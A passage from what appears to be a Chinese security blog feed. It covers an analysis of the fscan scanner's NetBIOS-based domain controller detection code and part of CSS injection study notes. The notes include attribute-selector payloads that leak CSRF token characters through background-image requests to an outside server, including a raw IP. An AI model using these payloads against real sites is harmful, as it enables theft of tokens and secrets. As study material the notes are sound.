class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">67</span>, <span class="number">75</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="comment">//senddata1 := []byte(&quot;ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01&quot;)</span></span><br><span class="line">realhost := fmt.Sprintf(<span class="string">&quot;%s:137&quot;</span>, info.Host)</span><br><span class="line">conn, err := net.DialTimeout(<span class="string">&quot;udp&quot;</span>, realhost, time.Duration(common.Timeout)*time.Second)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> conn != <span class="literal">nil</span> &#123;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = conn.SetDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">_, err = conn.Write(senddata1)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">text, _ := ReadBytes(conn)</span><br><span class="line">netbios, err = ParseNetBios(text)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从名字可以知道<br>NBNS = NetBIOS Name Service<br>通过想137端口发送UDP请求，然后获取到NetBios信息，并去解析，解析代码如下<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">GROUP_NAMES = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">    <span class="string">&quot;\x00&quot;</span>: <span class="string">&quot;DomainName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x1C&quot;</span>: <span class="string">&quot;DomainControllers&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x1E&quot;</span>: <span class="string">&quot;Browser Service Elections&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseNetBios</span><span class="params">(input []<span class="type">byte</span>)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input) &lt; <span class="number">57</span> &#123;</span><br><span class="line">err = netbioserr</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">data := input[<span class="number">57</span>:]</span><br><span class="line"><span class="keyword">var</span> num <span class="type">int</span></span><br><span class="line">num, err = bytetoint(input[<span class="number">56</span>:<span class="number">57</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> msg <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; num; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">18</span>*i+<span class="number">16</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">name := <span class="type">string</span>(data[<span class="number">18</span>*i : <span class="number">18</span>*i+<span class="number">15</span>])</span><br><span class="line">flag_bit := data[<span class="number">18</span>*i+<span class="number">15</span> : <span class="number">18</span>*i+<span class="number">16</span>]</span><br><span class="line"><span class="keyword">if</span> GROUP_NAMES[<span class="type">string</span>(flag_bit)] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="type">string</span>(flag_bit) != <span class="string">&quot;\x00&quot;</span> &#123;</span><br><span class="line">msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, GROUP_NAMES[<span class="type">string</span>(flag_bit)], name) <span class="comment">//这段代码是解析DC的关键</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> UNIQUE_NAMES[<span class="type">string</span>(flag_bit)] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="type">string</span>(flag_bit) != <span class="string">&quot;\x00&quot;</span> &#123;</span><br><span class="line">msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, UNIQUE_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="type">string</span>(flag_bit) == <span class="string">&quot;\x00&quot;</span> || <span class="built_in">len</span>(data) &gt;= <span class="number">18</span>*i+<span class="number">18</span> &#123;</span><br><span class="line">name_flags := data[<span class="number">18</span>*i+<span class="number">16</span> : <span class="number">18</span>*i+<span class="number">18</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> name_flags &gt;= <span class="number">128</span> &#123;</span><br><span class="line">msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, GROUP_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, UNIQUE_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">msg += fmt.Sprintf(<span class="string">&quot;%s \n&quot;</span>, name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(msg) == <span class="number">0</span> &#123;</span><br><span class="line">err = netbioserr</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = yaml.Unmarshal([]<span class="type">byte</span>(msg), &amp;netbios)</span><br><span class="line"><span class="keyword">if</span> netbios.DomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">netbios.GroupName = netbios.DomainName</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果刚刚NetBIOS请求中，某个字段存在 <code>\x1C</code> 就算他是 <code>DC</code><br>接下来看看 <code>netbios.String()</code><br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(info *NetBiosInfo)</span></span> String() (output <span class="type">string</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> text <span class="type">string</span></span><br><span class="line"><span class="comment">//ComputerName 信息比较全</span></span><br><span class="line"><span class="keyword">if</span> info.ComputerName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !strings.Contains(info.ComputerName, <span class="string">&quot;.&quot;</span>) &amp;&amp; info.GroupName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text = fmt.Sprintf(<span class="string">&quot;%s\\%s&quot;</span>, info.GroupName, info.ComputerName)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">text = info.ComputerName</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//组信息</span></span><br><span class="line"><span class="keyword">if</span> info.DomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text += info.DomainName</span><br><span class="line">text += <span class="string">&quot;\\&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.NetDomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text += info.NetDomainName</span><br><span class="line">text += <span class="string">&quot;\\&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//机器名</span></span><br><span class="line"><span class="keyword">if</span> info.ServerService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text += info.ServerService</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.WorkstationService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text += info.WorkstationService</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.NetComputerName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">text += info.NetComputerName</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> text == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.DomainControllers != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">output = fmt.Sprintf(<span class="string">&quot;[+] DC:%-24s&quot;</span>, text)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">output = fmt.Sprintf(<span class="string">&quot;%-30s&quot;</span>, text)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> info.OsVersion != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">output += <span class="string">&quot;      &quot;</span> + info.OsVersion</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>把刚刚解析的代码进行一个可以让他输出的操作，关键代码如下<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> info.DomainControllers != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    output = fmt.Sprintf(<span class="string">&quot;[+] DC:%-24s&quot;</span>, text)</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>分析源码的时候注意到 <code>icmp.go</code> 有点问题，可以进行命令注入，原理就不分析了，已经提交issue</p><ul><li><a href="https://github.com/shadow1ng/fscan/issues/321">https://github.com/shadow1ng/fscan/issues/321</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;朋友面试绿盟梅花K的时候被问到了fscan扫描DC的原理是什么，因为我也不是很清楚，刚开始以为是扫描88端口，后面调试了源码发现并不是&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="域渗透" scheme="https://kaikaix.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="https://kaikaix.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="go" scheme="https://kaikaix.github.io/tags/go/"/>
    
    <category term="fscan" scheme="https://kaikaix.github.io/tags/fscan/"/>
    
  </entry>
  
  <entry>
    <title>前端安全11-同源与Site（笔记）</title>
    <link href="https://kaikaix.github.io/2023/11/04/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A811-%E5%90%8C%E6%BA%90%E4%B8%8ESite%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/11/04/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A811-%E5%90%8C%E6%BA%90%E4%B8%8ESite%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-11-03T17:29:43.000Z</published>
    <updated>2023-11-03T17:29:43.536Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot; async&gt;&lt;/script&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全10-CSS injection（笔记）</title>
    <link href="https://kaikaix.github.io/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-25T20:18:11.000Z</published>
    <updated>2023-11-03T09:34:41.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没想到N1CTF出了css注入的题，第一眼就觉得是css注入，可惜那时候没学到这块，而且当时还在省赛（虽然应该也做不出来）</p><ul><li><a href="https://aszx87410.github.io/beyond-xss/ch3/css-injection/">https://aszx87410.github.io/beyond-xss/ch3/css-injection/</a><span id="more"></span></li></ul><h1 id="CSS注入简介"><a href="#CSS注入简介" class="headerlink" title="CSS注入简介"></a>CSS注入简介</h1><p>CSS可以通过判断属性中是否存在某个值，然后向外请求图片，这样就可以偷取存在于页面中的东西了，但是像 <code>document.cookie</code> 应该还是没办法的</p><h1 id="利用CSS偷取信息"><a href="#利用CSS偷取信息" class="headerlink" title="利用CSS偷取信息"></a>利用CSS偷取信息</h1><p>CSS有两个特性，当把两个特性结合在一起的时候就可以进行攻击了</p><ol><li>属性选择器</li></ol><ul><li><code>input[value^=a]</code> 可以选择到开头是a的</li><li><code>input[value$=a]</code> 选择结尾是a的</li><li><code>input[value*=a]</code> 选择含有a的</li></ul><ol><li>发送请求<br>在上面的判断成功后，可以向外发送请求，否则就收不到请求，很经典的类似于bool注入的攻击手法了<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;b&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=b</span>)</span><br><span class="line">&#125;</span><br><span class="line">//....</span><br></pre></td></tr></table></figure><blockquote><p>这里的input就是input标签，如果想选取例如 <code>&lt;a&gt;</code> 就可以</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[name=<span class="string">&quot;secret&quot;</span>]</span><span class="selector-attr">[href^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://101.43.112.74:9001/?q=a</span>)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">a</span> name=&quot;secret&quot; href=&quot;abc&quot;&gt;<span class="selector-tag">a</span>&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ol><h2 id="hidden属性如何偷取"><a href="#hidden属性如何偷取" class="headerlink" title="hidden属性如何偷取"></a>hidden属性如何偷取</h2><p>现在页面有如下的代码，应该如何取盗取他的token<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果直接构造前面的那个payload是没有效果的<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为他是hidden属性，并不会显示到页面上，css就不会去加载他<br>这时候可以去选取他的下一个属性<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> + <span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为他的下一个属性是存在于页面中的，这时候就能去加载，但是如果这个hidden在最后，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的方法就没法用了</p><blockquote><p>在form外面的是没法加载的，比如你的css是<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> + <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://101.43.112.74:9001</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>你的代码是<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/action&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样是不会有发出请求的</p></blockquote><p><code>:has</code> 现在有这么一个选择器<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span><span class="selector-pseudo">:has</span>(<span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span>)&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://example.com?q=a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>有这个选择器几乎就可以随便选了，但是目前firefox还不支持这个选择器。</p><h2 id="偷meta"><a href="#偷meta" class="headerlink" title="偷meta"></a>偷meta</h2><p>一般是通过js获取token，然后去提交<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span> <span class="comment">&lt;!-- 这是CSRF令牌 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Token Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;submit-button&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-button&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 从&lt;meta&gt;标签中获取CSRF令牌</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> csrfToken = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;csrf-token&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 创建一个HTTP请求</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 配置请求</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/process&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置请求头，包括CSRF令牌</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;X-CSRF-Token&quot;</span>, csrfToken);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 定义请求完成时的回调函数</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;请求成功！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;请求失败！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(<span class="string">&quot;data=example_data&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span 